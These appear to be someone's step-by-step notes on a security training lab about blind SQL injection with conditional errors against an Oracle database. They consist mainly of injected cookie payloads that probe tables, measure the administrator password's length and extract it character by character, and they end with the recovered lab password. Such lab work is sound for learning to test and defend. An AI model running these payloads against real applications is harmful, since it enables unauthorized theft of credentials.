# Lab: Blind SQL injection with conditional errors

### step1

```sql
TrackingId=I30VlRES0twQbZnB'
```

->false-> 500 Internal Server Error

### step2

```sql
TrackingId=I30VlRES0twQbZnB''
```

-> true -> 200 OK

### step3

```sql
TrackingId=I30VlRES0twQbZnB'||(SELECT '')||'
```

-> false-> 500 Internal Server Error

### step4

This may be due to the database type - try specifying a predictable table name in the query:

```sql
TrackingId=I30VlRES0twQbZnB'||(SELECT '' FROM dual)||'
```

-> true -> 200 ok
As you no longer receive an error, this indicates that the target is probably using an _Oracle_
database, which requires all `SELECT` statements to explicitly specify a table name.

### step5

```sql
TrackingId=I30VlRES0twQbZnB'||(SELECT '' FROM not-a-real-table)||'
```

->false->500 Internal Server Error

### step6

in order to verify that the `users` table exists, send the following query:

```sql
TrackingId=I30VlRES0twQbZnB'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
```

Note that the `WHERE ROWNUM = 1` condition is important here to prevent the query from returning more than one row, which would break our concatenation.

-> true -> 200 ok
_note:sql command for case_

```sql
SELECT OrderID, Quantity,
CASE
    WHEN Quantity > 30 THEN "The quantity is greater than 30"
    WHEN Quantity = 30 THEN "The quantity is 30"
    ELSE "The quantity is under 30"
END
FROM OrderDetails;
```

syntax:

```sql
CASE
    WHEN _condition1_ THEN _result1_
    WHEN _condition2_ THEN _result2_
    WHEN _conditionN_ THEN _resultN_
    ELSE _result_
END;
```

### step7

You can also exploit this behavior to test conditions. First, submit the following query:

```sql
TrackingId=I30VlRES0twQbZnB'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```

->false->500 Internal Server Error

### step8

change case

```sql
TrackingId=I30VlRES0twQbZnB'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```

-> true -> 200 ok

### step9

```sql
TrackingId=I30VlRES0twQbZnB'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

->false->500 Internal Server Error

### step10

```sql
TrackingId=I30VlRES0twQbZnB'||(SELECT CASE WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

->false->500 Internal Server Error

### step11

```sql
TrackingId=I30VlRES0twQbZnB'||(SELECT CASE WHEN LENGTH(password)>2 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'

```

->false->500 Internal Server Error

### step12

```sql
TrackingId=I30VlRES0twQbZnB'||(SELECT CASE WHEN LENGTH(password)>20 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'

```

-> true -> 200 ok  
it means password length is 20

### step13

```sql
TrackingId=I30VlRES0twQbZnB'||(SELECT CASE WHEN LENGTH(password)=20 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'

```

->false->500 Internal Server Error

### step14

```sql
TrackingId=I30VlRES0twQbZnB'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

-> true -> 200 ok

### step15

```sql
TrackingId=I30VlRES0twQbZnB'||(SELECT CASE WHEN SUBSTR(password,§1§,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

```
1  2  3  4  5  6  7  8  9  10  11 12   13   14  15  16  17  18  19  20

n  3  e  s  s  7  i  y  c   h   1   0   e   y   b   3  7   t   3    f

n3ess7iych10eyb37t3f
```

![screenshot](./images/payload_result.png)

first payload second payload and attack type similar to [[1_condtional_response|conditional response)
